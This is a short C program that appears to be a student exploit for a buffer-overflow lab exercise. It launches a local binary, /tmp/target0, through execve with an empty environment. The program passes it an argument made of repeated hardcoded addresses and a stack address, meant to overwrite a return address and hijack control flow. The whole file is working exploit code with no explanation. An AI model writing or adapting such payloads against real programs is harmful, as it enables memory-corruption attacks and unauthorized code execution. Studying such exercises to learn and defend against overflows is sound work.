#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3];
  char *env[1];
 
  args[0] = TARGET; args[1] = "\x1d\x85\x04\x08\x1d\x85\x04\x08\x1d\x85\x04\x08\x1d\x85\x04\x08\x1d\x85\x04\x08\xc5\xff\xff\xbf\x1d\x85\x04\x08"; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
